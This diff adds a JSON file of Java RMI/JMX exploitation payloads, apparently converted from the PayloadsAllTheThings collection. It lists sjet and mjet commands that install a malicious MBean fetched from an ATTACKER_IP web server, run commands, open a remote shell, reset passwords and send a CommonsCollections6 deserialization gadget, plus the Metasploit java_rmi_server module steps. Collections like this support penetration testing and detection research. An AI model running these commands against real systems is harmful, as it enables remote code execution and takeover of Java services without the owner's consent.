@@ -1,0 +1,33 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "java_rmi",
+  "original_category": "Java RMI",
+  "payloads": [
+    {
+      "category": "RCE using sjet or mjet",
+      "escalation": "baseline",
+      "lines": [
+        "jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000",
+        "jython sjet.py TARGET_IP TARGET_PORT super_secret command \"ls -la\"",
+        "jython sjet.py TARGET_IP TARGET_PORT super_secret shell",
+        "jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password",
+        "jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall",
+        "jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 \"touch /tmp/xxx\"",
+        "jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000",
+        "jython mjet.py TARGET_IP TARGET_PORT command super_secret \"whoami\"",
+        "jython mjet.py TARGET_IP TARGET_PORT command super_secret shell"
+      ]
+    },
+    {
+      "category": "RCE using Metasploit",
+      "escalation": "baseline",
+      "lines": [
+        "use exploit/multi/misc/java_rmi_server",
+        "set RHOSTS <IPs>",
+        "set RPORT <PORT>",
+        "run"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.871Z"
+}
